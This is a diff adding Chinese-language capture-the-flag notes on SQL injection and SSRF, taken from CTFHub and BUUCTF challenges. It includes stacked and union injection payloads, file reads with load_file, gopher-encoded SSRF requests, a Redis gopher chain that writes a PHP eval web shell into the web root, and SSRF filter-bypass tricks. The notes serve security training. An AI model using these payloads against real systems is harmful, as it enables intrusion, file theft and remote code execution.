@@ -19,6 +19,9 @@ tags:
 
 题目在 [CTFHub](https://www.ctfhub.com/#/index)　和　[BUUCTF](https://buuoj.cn/challenges)
 
+# 使用到的工具或网址
+[DNS重绑定](https://lock.cmpxchg8b.com/rebinder.html)
+
 # [SQL]
 ## 整数型注入
 > union内部的每个select语句必须拥有相同数量的列。
@@ -103,4 +106,69 @@ s = base64.b64decode(s)
 1'union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1
 ```
 ## [堆叠注入](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)
+`select`、`where`等都过虑掉了。
+```sql
+1';show databases;#
+1';show tables;#
+1'; show columns from `1919810931114514`;#
+1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#
+```
+sql预编译 prepare xxx_name from xxx_sql_exec; execute xxx_name;
+## [SQL注入与其它结合](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Fakebook)
+```sql
+view.php?no=-1%20union/**/select%201,2,3,4
+```
+fakebook -> users -> no,username,passwd,data -> O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:6:"1.html";} 
 
+union了半天发现没什么有用信息
+
+githacker扫描没发现问题，dirsearch扫描发现有robots.txt和flag.php，txt里面显示有user.php.bak，里面是源码。
+
+```sql
+view.php?no=-1%20union/**/select%201,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+
+view.php?no=-1%20union/**/select%201,load_file(%27/var/www/html/flag.php%27),3,4#
+```
+# [XSS]
+
+# [SSRF]
+## [内网访问]
+url=127.0.0.1/flag.php
+## [伪协议]
+url=file:///var/www/html/flag.php
+结果不一定显示在页面上，也可能隐藏在response中。
+## [端口扫描]
+url=127.0.0.1:8000 ~ url=127.0.0.1:9000  
+BurpSuite的Intruder端口遍历扫描爆破
+## [Gopher协议]
+```
+gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D34ae68383f7ec667fa74685d316cb34d
+```
+页面可以直接添加
+```
+<input type="submit" name="submit" >
+``` 
+gopher编码后，`%0D`->`%250D`,`:`->`%253A`,`%0A`->`%250A`...
+## [redis协议]
+```sh
+config set dir /var/www/html/ 
+config set dbfilename shell.php
+set x <?php @eval($_POST['cmd']);?>
+save
+
+gopher%3A%2F%2F127.0.0.1%3A6379%2F_config%2520set%2520dir%2520%2Fvar%2Fwww%2Fhtml%2F%250D%250Aconfig%2520set%2520dbfilename%2520shell.php%250D%250Aset%2520x%2520%2522%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%2522%250D%250Asave%250D%250A
+```
+## [ByPass]
+* url: HTTP的基本身份认证允许Web浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证，格式为http://user@domain。以@分割URL，前面为用户信息，后面才是真正的请求地址
+* number: 127.0.0.1, localhost, 0, 0.0.0.0...
+* 302跳转绕过
+* DNS重绑定绕过
+## []
+```
+127.0.0.1:9000
+```
+gopher
+```
+```
+
+# [SSRF Deeper]
